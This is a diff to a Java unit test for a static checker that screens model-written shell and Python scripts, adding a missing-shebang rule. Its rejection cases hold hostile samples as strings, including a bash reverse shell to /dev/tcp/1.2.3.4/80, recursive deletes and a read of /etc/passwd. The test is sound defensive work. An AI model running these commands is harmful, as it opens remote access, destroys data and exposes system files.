@@ -42,10 +42,15 @@ class ScriptStaticCheckTest {
                 Arguments.of("REVERSE_SHELL", "run.sh", "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/80\n"),
                 Arguments.of("DESTRUCTIVE_RM", "run.sh", "#!/bin/sh\nrm -rf /tmp/whatever\n"),
                 Arguments.of("WRITE_OUTSIDE", "run.sh", "#!/bin/sh\necho hi > /tmp/leak\n"),
-                Arguments.of("PY_SUBPROCESS", "main.py", "import subprocess\nprint(subprocess.run(['ls']))\n"),
-                Arguments.of("PY_NETWORK", "main.py", "import requests\nprint(requests.get('http://x'))\n"),
-                Arguments.of("PY_DESTRUCTIVE", "main.py", "import shutil\nshutil.rmtree('/tmp')\n"),
-                Arguments.of("PY_FILE_ESCAPE", "main.py", "print(open('/etc/passwd').read())\n"));
+                Arguments.of("PY_SUBPROCESS", "main.py",
+                        "#!/usr/bin/env python3\nimport subprocess\nprint(subprocess.run(['ls']))\n"),
+                Arguments.of("PY_NETWORK", "main.py",
+                        "#!/usr/bin/env python3\nimport requests\nprint(requests.get('http://x'))\n"),
+                Arguments.of("PY_DESTRUCTIVE", "main.py",
+                        "#!/usr/bin/env python3\nimport shutil\nshutil.rmtree('/tmp')\n"),
+                Arguments.of("PY_FILE_ESCAPE", "main.py",
+                        "#!/usr/bin/env python3\nprint(open('/etc/passwd').read())\n"),
+                Arguments.of("NO_SHEBANG", "run.sh", "echo hello\n"));
     }
 
     @ParameterizedTest(name = "{0} 被挡下")
@@ -79,14 +84,32 @@ class ScriptStaticCheckTest {
             "#!/bin/sh\necho 'hello'\n",
             "#!/bin/sh\nprintf '%s\\n' \"$1\" | tr a-z A-Z\n",
             "#!/bin/sh\nfor i in 1 2 3; do echo $i; done\n",
-            "print(sum(range(10)))\n",
-            "import sys\nprint(len(sys.argv))\n",
-            "text = 'abcdef'\nprint(text.upper())\n"})
+            "#!/usr/bin/env python3\nprint(sum(range(10)))\n",
+            "#!/usr/bin/env python3\nimport sys\nprint(len(sys.argv))\n",
+            "#!/usr/bin/env python3\ntext = 'abcdef'\nprint(text.upper())\n"})
     @DisplayName("正常的脚本必须放行：只测「危险被挡下」的话，全拒的实现也会绿")
     void 正常脚本放行(String script) {
-        String entrypoint = script.startsWith("#!") || script.contains("echo") ? "run.sh" : "main.py";
+        String entrypoint = script.contains("echo") ? "run.sh" : "main.py";
 
         assertThat(check.check(entrypoint, script).accepted()).isTrue();
+    }
+
+    /**
+     * 缺 shebang 必须在<b>落盘之前</b>被挡下。
+     *
+     * <p>这条规则是票 08 才有的：脚本改直接执行之后，第一行不给解释器就等于
+     * "进程起不来"，而那时给的话是操作系统的一句格式错误，
+     * 模型看不懂、也不知道该补哪一行。
+     */
+    @Test
+    @DisplayName("第一行不是 shebang 的脚本被挡在落盘之前")
+    void 缺shebang被拒() {
+        ScriptStaticCheck.Report report = check.check("run.sh", "echo hello\n");
+
+        assertThat(report.accepted()).isFalse();
+        assertThat(report.findings()).extracting(ScriptStaticCheck.Finding::ruleId)
+                .contains(ScriptStaticCheck.NO_SHEBANG);
+        assertThat(report.render()).contains("第 1 行");
     }
 
     /** 注释里提到 curl 不该被拒：注释不执行，按注释拒掉会逼模型改掉一段其实没问题的说明。 */
